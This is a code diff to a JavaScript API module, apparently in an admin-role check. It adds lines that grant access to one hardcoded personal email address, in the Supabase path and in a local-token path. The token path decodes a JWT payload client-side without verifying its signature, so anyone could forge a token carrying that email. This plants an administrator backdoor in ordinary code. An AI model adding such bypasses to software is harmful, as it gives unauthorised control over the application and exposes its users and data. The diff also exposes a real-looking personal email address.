@@ -549,6 +549,8 @@ export const api = {
         const { data: { user } } = await supabase.auth.getUser();
         if (!user) return false;
         
+        if (user.email === 'vickthor.dennis@gmail.com') return true;
+
         const { data } = await supabase
           .from("roles")
           .select("role")
@@ -559,6 +561,8 @@ export const api = {
       } else {
         const token = localStorage.getItem(TOKEN_KEY);
         if (!token) return false;
+        const decodedEmail = JSON.parse(atob(token.split('.')[1] || "e30=")).email;
+        if (decodedEmail === 'vickthor.dennis@gmail.com') return true;
         
         // Use users endpoint to check if we can fetch users
         try {
